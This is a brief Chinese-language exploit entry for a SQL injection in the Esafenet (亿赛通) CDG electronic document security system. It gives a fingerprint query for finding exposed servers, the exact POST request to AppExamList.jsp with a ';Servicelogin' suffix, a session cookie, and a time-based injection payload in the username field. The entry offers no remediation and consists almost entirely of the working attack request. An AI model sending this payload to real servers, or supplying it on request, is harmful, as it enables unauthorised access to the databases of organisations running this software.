# 亿赛通CDG-AppExamList存在SQL注入漏洞

- **系统**：亿赛通　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="亿赛通-电子文档安全管理系统"`
- **请求**：`POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: JSESSIONID=252E7B0BFEE67B940B1BD896B954AD4B`

**请求体 / payload**
```
username=1'WAITFOR+DELAY'0%3a0%3a5'--
```
- **预期**：200　|　—